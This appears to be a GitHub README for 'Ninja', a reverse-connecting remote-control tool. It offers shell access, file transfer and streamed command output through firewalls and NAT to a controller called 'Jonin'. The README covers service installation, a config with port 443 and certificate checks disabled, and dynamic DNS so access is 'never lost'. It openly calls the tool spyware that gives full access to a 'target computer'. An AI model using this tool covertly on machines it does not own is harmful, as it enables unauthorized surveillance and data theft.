# Ninja [![version-shield]][release] [![cross-platform-shield]](#platforms)
> A general-purpose fully customizable software to control a remote computer behind any NAT, Firewall and proxy. Providing secure shell access, file transfer and shell stream (stream shell output from remote to a local file)

![logo]

# [Download][release]
You can download latest release from [here][release]

# Features

- Secure shell access to remote ([Ninja][ninja]) computer
- File upload/download (Multiple files at once) to/from remote ([Ninja][ninja])
- Shell stream, run command on remote ([Ninja][ninja]) and stream output to a file on local ([Jonin][jonin])

# Platforms

![windows] | ![macos] | ![linux] |
--- | --- | --- |
Tested on Windows 10 ✔ | Not tested but should work | Not tested but should work |

# Overview

Ninja is a portable remote computer control software. Once it's ran on a remote computer, it will provide you shell access, file transfer (upload/download) and shell stream. 
There's no need to open ports on the remote computer, even if it uses a cellular data network and is behind proxies, there will be no problem in connection since Ninja wont listen on a port for conenctions and instead will ask the controller or the __[Jonin][jonin]__ computer for connection (WebSocket if available, otherwise xhr polling). So the controller computer should be running __[Jonin][jonin]__ and have the required port open.

- [Download](#download)
- [Features](#features)
- [Platforms](#platforms)
- [Overview](#overview)
- [Jonin](#jonin)
- [Setup & Usage](#setup--usage)
- [Single Click Installer](#single-click-installer)
- [Configuration File](#configuration-file)
- [Host Setup](#host-setup)
    - [Use Dynamic DNS](#use-dynamic-dns)
    - [Use A VPS](#use-a-vps)
    - [Use A Static IP Address](#use-a-static-ip-address)
    - [Use A Domain Name](#use-a-domain-name)
- [Use As Spyware](#use-as-spyware)



# [Jonin][jonin]
Jonin is the pair for Ninja which can control (order!) multiple __Ninja__ instances. You'll need to use it on the controller computer in order to communicate with a Ninja

# Setup & Usage

To setup Ninja, you only need to: 

- Downlaod the __[release][release]__ and extract it 
- Change __HOST__ and __PORT__ in `config/constants.json`. The __PORT__ config should match __[Jonin][jonin]__'s port config and __HOST__ should point to __[Jonin][jonin]__ computer. Please read [This Guide][host-setup] about how to setup HOST to never lose access to Ninja
- You're all set. Happy spying!


__You can check __[Jonin][jonin]__ (the controller of Ninja) for details on how to control Ninja and list of commands__

# Single Click Installer
You can use this single click installer (which uses [Servicifier][servicifier]) on windows: 

[windows single click installer][windows-single-click-installer]

__Please note that you should still change HOST and PORT in [Ninja config file](#configuration-file) as explained in [Setup & Usage](#setup--usage) (for this installer, it will be in `files/config/constants.json`), before you use the installer. Also note that this installer, will install Ninja in `C:/Ninja` and name the service `ninja.exe`. To customize this, you can change installation config file in `config/installation-config.json` (check [here][servicifier-install-config] for installation config format). Also to make installer ask for installation config values when you run it, instead of automatically using config file, you can simply remove installation config file__

# Configuration File
You can find this file in `config/constants.json`:

```jsonc
{
	// connection port
    "PORTS": {
        "DATA": 443
    },

    // name to identify Ninja on Jonin when working with multiple Ninjas
    "NAME": "Ninja Name",

    // Jonin computer's address
    "HOST": "domain.com", 

    // connection config. any valid Socket.io option
    "CONNECTION": {
        "RECONNECTION_DELAY_MAX": 5000,
        "RECONNECTION_DELAY": 1000,
        "TIMEOUT": 20000,

        "rejectUnauthorized": false
    },

    // interval in which file receiver party will send ack to sender
    "FILE_TRANSFER": {
        "ACK_INTERVAL": 2000
    },

    // stop logging, this SHOULD BE true when using as a sevice to prevent 
    // logs file growing forever 
    "NO_LOG": false,

    "PROGRESS_BAR": {
    	// progress bar colors 
        "COLOR_MAP": {
            "FAILED": ["red", "red"],
            "INVALID": ["red", "red"],
            "DONE": ["gray", "green"],
            "IN_PROGRESS": ["gray", "cyan"]
        },
        // progress bar name/label maximum length
        "MAX_NAME_LENGTH": 10
    }
}

```

# Host Setup
When configuring __[Ninja][ninja]__, you should use a __HOST__ that points to __[Jonin][jonin]__ computer and also will always be available. So you'll have to use one of the following options:

### Use Dynamic DNS
This is the best way I can suggest since It's free and easy. you just need to create an account in one of DDNS services (like [Duck DNS][duckdns] and [No-Ip][noip]), create a domain name and set it to point to your dynamic IP address. If your ISP changed your IP, then just simply change it on DDNS website or install a Dynamic Update Client (DUC) to do this for you automatically.

### Use A VPS
You can purchase a VPS and use its IP or hostname as __HOST__ in config file. However you'll always have to control your Ninjas from this VPS. Another downside is that this is paid.

### Use A Static IP Address
You can use an IP address for your Jonin and set this IP in __[Ninja][ninja]__'s configuration. This is not recommended since you'll have to spend money while there are easy free ways, unless you have a static IP already

### Use A Domain Name
Just like static IP, you can use a domain name for your Jonin and set this name in __[Ninja][ninja]__'s configuration. For same reason as static IP, this also is not a recommended way

# Use As Spyware
Be aware Ninja can be easily used as a spyware when installed as a service, it will open full access to the target computer for the __[Jonin][jonin]__ controlling it

[version-shield]: https://img.shields.io/badge/Version-1.0.0-blue
[cross-platform-shield]: https://img.shields.io/badge/Cross-Platform-brightgreen
[logo]: https://user-images.githubusercontent.com/46329768/120105801-c379c480-c16f-11eb-8392-9880633e7d41.jpg
[ninja]: https://github.com/ErAz7/Ninja
[jonin]: https://github.com/ErAz7/Jonin
[servicifier]: https://github.com/ErAz7/servicifier
[servicifier-install-config]: https://github.com/ErAz7/servicifier#installation-config
[release]: https://github.com/ErAz7/Ninja/releases
[host-setup]: #host-setup
[windows]: https://user-images.githubusercontent.com/46329768/120122894-fa2bfb00-c1c0-11eb-9700-8a55d43f1e01.png
[macos]: https://user-images.githubusercontent.com/46329768/120122895-fbf5be80-c1c0-11eb-92c4-fba52ce104cc.png
[linux]: https://user-images.githubusercontent.com/46329768/120122893-f7c9a100-c1c0-11eb-8c7b-405c73691113.png
[windows-single-click-installer]: https://github.com/ErAz7/Ninja/releases/download/1.0.0/Ninja-v1.0.0-win-single-click-installer.rar